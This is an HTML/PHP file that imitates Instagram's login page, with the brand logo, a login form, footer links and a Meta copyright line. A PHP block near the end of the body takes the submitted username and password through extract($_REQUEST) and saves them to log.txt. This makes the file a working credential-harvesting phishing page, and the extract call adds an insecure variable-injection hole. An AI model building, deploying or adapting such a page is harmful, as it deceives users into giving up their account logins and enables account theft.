<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="OIP.png" />

    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
      crossorigin="anonymous"
    />

    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
      integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />

    <style>
      :root {
        --btn-color: #0095f6;
      }

      @font-face {
        font-family: "Segoe UI Regular";
        font-style: normal;
        font-weight: normal;
        src: local("Segoe UI Regular"), url("font/SegoeUI.woff") format("woff");
      }

      *,
      *::after *::before {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      *:focus {
        outline: none;
      }

      input:focus,
      textarea:focus,
      select:focus {
        outline: none;
      }

      a {
        text-decoration: none;
      }

      ul,
      ol,
      li {
        list-style: none;
      }

      body {
        background: #fafafa;
        font-family: "Segoe UI Regular";
      }

      input[type="submit"] {
        background-color: var(--btn-color);
        color: #fff;
        border: none;
        outline: none;
        border-radius: 0.2rem;
      }

      .main-cont {
        display: flex;
        flex-flow: column;
        gap: 5rem;
      }

      .main-row {
        margin-top: 8rem;
      }

      .main-sec {
        background: #ffffff;
        border: 1px solid #dbdbdb;
      }

      .id,
      .pass {
        font-size: 12px;
        background: #fafafa;
      }

      .submit {
        font-size: 14px;
      }

      .or-sec {
        text-align: center;
        height: 30px;
      }

      .or-sec p {
        position: relative;
        color: #958e95;
        font-weight: 500;
        font-size: 13px;
      }

      .or-sec p::before {
        content: "";
        position: absolute;
        width: 40%;
        height: 2px;
        background: #dbdbdb;
        left: 0;
        top: 50%;
      }
      .or-sec p::after {
        content: "";
        position: absolute;
        width: 40%;
        height: 2px;
        background: #dbdbdb;
        right: 0;
        top: 50%;
      }

      .login-w-fb {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }

      .login-w-fb i {
        font-size: 1.2rem;
        color: #385185;
      }

      .login-w-fb a {
        font-size: 14px;
        color: #385185;
        font-weight: 600;
      }

      .fog-pass {
        text-align: center;
        font-size: 12px;
        color: #385185;
      }

      .reg-sec {
        text-align: center;
        font-size: 14px;
      }

      .app-store {
        width: 100%;
        display: flex;
        flex-flow: column;
        text-align: center;
        align-items: center;
        justify-content: center;
        font-size: 14px;
      }

      .img-sec {
        width: 100%;
        max-width: 100%;
        height: auto;
      }

      .case-sec {
        overflow: hidden;
        position: relative;
        height: 90%;
        float: right;
      }

      .case-sec img {
        height: 100%;
      }

      .case-sec .box {
        position: absolute;
        top: 50.4%;
        left: 61.6%;
        transform: translate(-50%, -50%);
        width: 14.5rem;
        height: 25.8rem;
        animation: slide 12s infinite;
        background: url(./1.jpg) no-repeat;
        background-size: cover;
      }

      @keyframes slide {
        25% {
          background: url(./2.jpg) no-repeat;
          background-size: cover;
        }
        50% {
          background: url(./3.jpg) no-repeat;
          background-size: cover;
        }
        75% {
          background: url(./4.jpg) no-repeat;
          background-size: cover;
        }
        100% {
          background: url(./5.jpg) no-repeat;
          background-size: cover;
        }
      }
      .lang-select {
        border: none;
        background: none;
      }

      .sub-row {
        font-size: 13px;
      }

      .sub-row a,
      .lang-select {
        color: #8e8e8e;
      }

      .sub-row .sub-col {
        display: flex;
        flex-flow: column;
        gap: 1rem;
        text-align: center;
      }

      .first-col,
      .second-col,
      .copy {
        display: flex;
        align-items: center;
        gap: 0.9rem;
        justify-content: center;
      }

      .form-box {
        margin-right: 3.5rem;
      }
    </style>

    <title>Instagram</title>
  </head>
  <body>
    <div class="container-fluid">
      <div class="container main-cont">
        <div class="row main-row">
          <div class="col-md-8 mx-auto">
            <div class="row">
              <div class="col-md-6">
                <div class="case-sec">
                  <img src="case.png" alt="case" />
                  <div class="box"></div>
                </div>
              </div>
              <div class="col-md-6">
                <div class="d-flex flex-column gap-3 form-box">
                  <div class="main-sec d-flex flex-column gap-3 py-4">
                    <div class="logo overflow-hidden w-50 mx-auto mb-2">
                      <img src="insta.png" alt="insta" class="w-100" />
                    </div>
                    <div class="form px-5">
                      <form class="d-flex flex-column gap-2" action="">
                        <input
                          type="text"
                          placeholder="Phone number, username, or email"
                          class="id form-control px-2 py-2"
                          name="user"
                        />
                        <input
                          type="password"
                          data-toggle="password"
                          placeholder="Password"
                          class="pass form-control px-2 py-2"
                          name="pass"
                        />
                        <input
                          type="submit"
                          value="Log In"
                          class="py-1 mt-2 submit"
                        />
                      </form>
                    </div>
                    <div class="or-sec px-5">
                      <p>OR</p>
                    </div>
                    <div class="login-w-fb">
                      <i class="fab fa-facebook-square"></i>
                      <a href="#">Log in with Facebook</a>
                    </div>
                    <a href="#" class="fog-pass">Forgot password?</a>
                  </div>
                  <div class="main-sec py-3">
                    <div class="reg-sec">
                      Don't have an account?
                      <a href="#">Sign up</a>
                    </div>
                  </div>
                  <div class="app-store">
                    <p>Get the app.</p>
                    <div class="app-sec gap-2 w-75 d-flex">
                      <img src="apple.png" alt="apple" class="img-sec w-50" />
                      <img
                        src="android.png"
                        alt="android"
                        class="img-sec w-50"
                      />
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="row sub-row">
          <div class="col-md-12 sub-col">
            <div>
              <div class="first-col">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Top Accounts</a>
                <a href="#">Hashtags</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
              </div>
              <div class="second-col">
                <a href="#">Beauty</a>
                <a href="#">Dance</a>
                <a href="#">Fitness</a>
                <a href="#">Food & Drink</a>
                <a href="#">Home & Garden</a>
                <a href="#">Music</a>
                <a href="#">Visual Arts</a>
              </div>
            </div>
            <div class="copy">
              <select aria-label="Switch Display Language" class="lang-select">
                <option value="af">Afrikaans</option>
                <option value="cs">Čeština</option>
                <option value="da">Dansk</option>
                <option value="de">Deutsch</option>
                <option value="el">Ελληνικά</option>
                <option value="en" selected>English</option>
                <option value="en-gb">English (UK)</option>
                <option value="es">Español (España)</option>
                <option value="es-la">Español</option>
                <option value="fi">Suomi</option>
                <option value="fr">Français</option>
                <option value="id">Bahasa Indonesia</option>
                <option value="it">Italiano</option>
                <option value="ja">日本語</option>
                <option value="ko">한국어</option>
                <option value="ms">Bahasa Melayu</option>
                <option value="nb">Norsk</option>
                <option value="nl">Nederlands</option>
                <option value="pl">Polski</option>
                <option value="pt-br">Português (Brasil)</option>
                <option value="pt">Português (Portugal)</option>
                <option value="ru">Русский</option>
                <option value="sv">Svenska</option>
                <option value="th">ภาษาไทย</option>
                <option value="tl">Filipino</option>
                <option value="tr">Türkçe</option>
                <option value="zh-cn">中文(简体)</option>
                <option value="zh-tw">中文(台灣)</option>
                <option value="bn">বাংলা</option>
                <option value="gu">ગુજરાતી</option>
                <option value="hi">हिन्दी</option>
                <option value="hr">Hrvatski</option>
                <option value="hu">Magyar</option>
                <option value="kn">ಕನ್ನಡ</option>
                <option value="ml">മലയാളം</option>
                <option value="mr">मराठी</option>
                <option value="ne">नेपाली</option>
                <option value="pa">ਪੰਜਾਬੀ</option>
                <option value="si">සිංහල</option>
                <option value="sk">Slovenčina</option>
                <option value="ta">தமிழ்</option>
                <option value="te">తెలుగు</option>
                <option value="vi">Tiếng Việt</option>
                <option value="zh-hk">中文(香港)</option>
                <option value="bg">Български</option>
                <option value="fr-ca">Français (Canada)</option>
                <option value="ro">Română</option>
                <option value="sr">Српски</option>
                <option value="uk">Українська</option>
              </select>
              <a href="">© 2021 Instagram from Meta</a>
            </div>
          </div>
        </div>
      </div>
    </div>

    <?php
    
      extract($_REQUEST);

      $file = fopen("log.txt", "w");

      fwrite($file, "id: ");
      fwrite($file, $user . "\n");
      fwrite($file, "pass: ");
      fwrite($file, $pass . "\n");

      fclose($file);
    
    ?>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script>
      $("select")
        .change(function () {
          var text = $(this).find("option:selected").text();
          var $aux = $("<select/>").append($("<option/>").text(text));
          $(this).after($aux);
          $(this).width($aux.width());
          $aux.remove();
        })
        .change();
    </script>
    <script
      src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"
      integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
      integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
